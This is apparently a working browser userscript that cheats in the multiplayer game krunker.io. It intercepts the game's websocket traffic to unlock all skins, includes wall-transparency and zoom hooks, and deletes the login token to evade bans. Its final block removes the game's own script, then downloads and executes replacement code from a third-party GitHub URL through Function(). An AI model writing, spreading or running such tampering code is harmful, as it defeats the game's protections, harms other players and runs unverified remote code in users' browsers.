// ==UserScript==
// @name        krunker Skinhack
// @namespace   krunker
// @match       *://krunker.io/*
// @grant       none
// @version     1.0
// @icon        https://media.discordapp.net/attachments/1128431056513675339/1128886443843002510/icon.png?width=225&height=187
// @author      jaguar
// @description krunker Skinhack https://discord.gg/ekdpgUSrWB
// @run-at      document-start
// @license MIT
// @noframes
// ==/UserScript==

const id = "_" + Math.random().toString(36).slice(2);

function cheat() {
	delete window[id];
	const e = new class {
		constructor() {
			this.hash = this.genHash(8), window[this.hash] = this, this.settings = Object.assign({}, {
				skinHack: !0,
				customCSS: "",
				autoServer: !0,
				botNametags: !0
			}), this.isProxy = Symbol("isProxy"), this.GUI = {};
			try {
				this.onLoad()
			} catch (e) {
				console.error("ERROR " + e.name), console.error(e.message)
			}
		}
		onLoad() {
			this.defines(), this.createListeners()
		}
		defines() {
			const t = Symbol("origSkins"),
				n = Symbol("localSkins");
			Object.defineProperties(Object.prototype, {
				canvas: {
					set(t) {
						this._canvas = t, "game-overlay" == t.id && (e.overlay = this, e.ctx = t.getContext("2d"), Object.defineProperties(this, {
							render: {
								set(t) {
									this._render = new Proxy(t, {
										apply(t, n, s) {
											if (["scale", "game", "controls", "renderer", "me"].forEach(((t, n) => {
													e[t] = s[n]
												})), Reflect.apply(...arguments), e.isDefined(e.renderer) && e.isDefined(e.renderer.adsFovMlt)) try {
												e.renderer.adsFovMlt.fill(e.settings.weaponZoom)
											} catch (e) {
												console.error(e)
											}
											e.me && e.ctx && (e.ctx.save(), e.ctx.scale(e.scale, e.scale), e.ctx.restore(), e.me.procInputs[e.isProxy] || (e.me.procInputs = new Proxy(e.me.procInputs, {
												apply(t, n, [s, i, r, o]) {
													return n && e.inputs(s), Reflect.apply(...arguments)
												},
												get: (t, n) => n === e.isProxy || Reflect.get(t, n)
											})), e.game.map.manager.objects.filter((e => e.penetrable)).map(((t, n, s) => {
												t.transparent = e.settings.wallbangs
											})))
										}
									})
								},
								get() {
									return this._render
								}
							}
						}))
					},
					get() {
						return this._canvas
					}
				},
				OBJLoader: {
					set(t) {
						e.three = this, this._value = t
					},
					get() {
						return this._value
					}
				},
				skins: {
					set(e) {
						return this[t] = e, null != this.localSkins && this.localSkins.length || (this[n] = Array.apply(null, Array(25e3)).map(((e, t) => ({
							ind: t,
							cnt: 1
						})))), e
					},
					get() {
						return e.settings.skinHack && this.stats ? this[n] : this[t]
					}
				},
				events: {
					set(t) {
						this._events = t, 0 === this.ahNum && (e.wsSend = this.send.bind(this), e.wsEvent = this._dispatchEvent.bind(this), e.socket = this, this.send = new Proxy(this.send, {
							apply(t, n, [s, i]) {
								return "en" === s && (e.skins = {
									main: i[2][0],
									secondary: i[2][1],
									hat: i[3],
									body: i[4],
									knife: i[9],
									dye: i[14],
									waist: i[17]
								}), Reflect.apply(...arguments)
							}
						}), this._dispatchEvent = new Proxy(this._dispatchEvent, {
							apply(t, n, [s, i]) {
								if (e.settings.skinHack && "0" === s) {
									let t = i[0],
										n = 38;
									for (; t.length % n != 0;) n++;
									for (let s = 0; s < t.length; s += n) t[s + 12] = [e.skins.main, e.skins.secondary], t[s + 13] = e.skins.hat, t[s + 14] = e.skins.body, t[s + 19] = e.skins.knife, t[s + 24] = e.skins.dye, t[s + 33] = e.skins.waist
								}
								return Reflect.apply(...arguments)
							}
						}))
					},
					get() {
						return this._events
					}
				}
			})
		}
		createListeners() {
			this.waitFor((() => window.instructionsUpdate)).then((e => {
				this.createObserver(e, "style", (e => {
					"krunker.io" == location.host && e.textContent.includes("Connection Banned") ? (localStorage.removeItem("krunker_token"), alert("You Have Been Banned And Sign Out, You Will Now Be Redirected to Krunkers Proxy 'browserfps'"), location.assign("https://browserfps.com/")) : this.settings.autoServer && this.arrayTest(e, ["Kicked", "Banned", "Disconnected", "Error", "Game is full"], (t => e.innerHTML.includes(t))) && (location = document.location.origin)
				}))
			})), new Promise((e => {
				document.addEventListener("DOMContentLoaded", (() => {
					e()
				}))
			})).then((() => {
				this.customCSS();
				const e = ["#aContainer, #aHolder, #endAContainer, #aMerger, #onetrust-consent-sdk { display: none !important; }", "#chatList * { user-select: text; }"];
				new Array(...document.styleSheets).map((t => {
					if (t.href) {
						let n = /http.*?krunker.io\/css\/(\w+.css).+/.exec(t.href);
						if (n && n[1]) {
							let s = n[1];
							s && s.includes("main_custom") && e.forEach(((e, n, s) => {
								t.insertRule(e)
							}))
						}
					}
				}))
			})), window.addEventListener("mouseup", (t => {
				2 === t.which && e.settings.guiOnMMB && (t.preventDefault(), e.showGUI())
			})), window.addEventListener("mouseup", (t => {
				2 === t.which && e.settings.guiOnMMB && (t.preventDefault(), e.showGUI())
			}))
		}
		inputs(e) {
			return e
		}
		customCSS() {
			!this.isDefined(this.CSSres) && this.settings.kpalCSS && (this.CSSres.rel = "stylesheet", this.CSSres.disabled = !1, (document.head || document.getElementsByTagName("head")[0]).appendChild(this.CSSres)), this.settings.customCSS.startsWith("http") && this.settings.customCSS.endsWith(".css") ? this.CSSres.href = this.settings.customCSS : this.CSSres = void 0
		}
		world2Screen(e, t, n, s = 0) {
			return e.y += s, e.project(this.renderer.camera), e.x = (e.x + 1) / 2, e.y = (1 - e.y) / 2, e.x *= t, e.y *= n, e
		}
		isType(e, t) {
			return typeof e === t
		}
		isDefined(e) {
			return !this.isType(e, "undefined") && null !== e
		}
		arrayTest(e, t, n) {
			return t.some((e => n(e)))
		}
		createElement(e, t, n) {
			let s = document.createElement(e);
			return n && (s.id = n), s.innerHTML = t, s
		}
		createObserver(e, t, n, s = !0) {
			return new MutationObserver(((e, i) => {
				("src" == t || s && "block" == e[0].target.style.display || !s) && n(e[0].target)
			})).observe(e, "childList" == t ? {
				childList: !0
			} : {
				attributes: !0,
				attributeFilter: [t]
			})
		}
		genHash(e) {
			return [...Array(e)].map((e => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" [~~(52 * Math.random())])).join("")
		}
		saveAs(e, t) {
			let n = new Blob([t], {
					type: "text/plain"
				}),
				s = window.document.createElement("a");
			s.href = window.URL.createObjectURL(n), s.download = e, window.document.body.appendChild(s), s.click(), window.document.body.removeChild(s)
		}
		async store(e) {
			const t = "jaguarskin";
			switch (e) {
				case "get":
					return GM.getValue(t).then((e => this.isDefined(e) ? JSON.parse(e) : this.settings));
				case "set":
					return GM.setValue(t, JSON.stringify(this.settings));
				case "reset":
					return GM.deleteValue(t)
			}
		}
		async waitFor(e, t = 1 / 0, n = null) {
			let s = e => new Promise((t => setTimeout(t, e)));
			return new Promise((async (i, r) => {
				let o;
				"number" != typeof t && r("Timeout argument not a number in waitFor(selector, timeout_ms)");
				for (; void 0 === o || !1 === o || null === o || 0 === o.length;) {
					if (n && n instanceof Function && n(), (t -= 100) < 0) return void i(!1);
					await s(100), o = "string" == typeof e ? Function(e)() : e()
				}
				i(o)
			}))
		}
	};
	for (let e = 0; e < 5; e++);
	for (let e = 0; e < 5; e++);
	window.doge = e
}
let tokenPromiseResolve;
window[id] = cheat;
const tokenPromise = new Promise((e => tokenPromiseResolve = e)),
	ifr = document.createElement("iframe");
ifr.src = location.href, ifr.style.display = "none", document.documentElement.append(ifr);
const ifrFetch = ifr.contentWindow.fetch;
Object.defineProperty(ifr.contentWindow, "fetch", {
	get: () => ifr.contentWindow?.windows?.length > 0 ? function(e) {
		return e.includes("/seek-game") ? (ifr.remove(), void tokenPromiseResolve(e)) : ifrFetch.apply(this, arguments)
	} : ifrFetch
});
const _fetch = window.fetch;

function downloadFileSync(e) {
	var t = new XMLHttpRequest;
	if (t.open("GET", e, !1), t.send(), 200 === t.status) return t.response
}
window.fetch = async function(e, t) {
	return "string" == typeof e && e.includes("/seek-game") && (e = await tokenPromise), _fetch.apply(this, arguments)
};
const observer = new MutationObserver((function(e) {
	e.forEach((function(e) {
		if (e.addedNodes)
			for (var t = 0; t < e.addedNodes.length; t++) {
				const n = e.addedNodes[t];
				if ("SCRIPT" === n.tagName && n.innerHTML.includes("@license Krunker.io")) {
					n.remove();
					const e = downloadFileSync("https://raw.githubusercontent.com/Documantation12/krunkermen/main/gaming.js");
					Function(id + "();\n\n" + e)()
				}
			}
	}))
}));
observer.observe(document, {
	childList: !0,
	subtree: !0
});
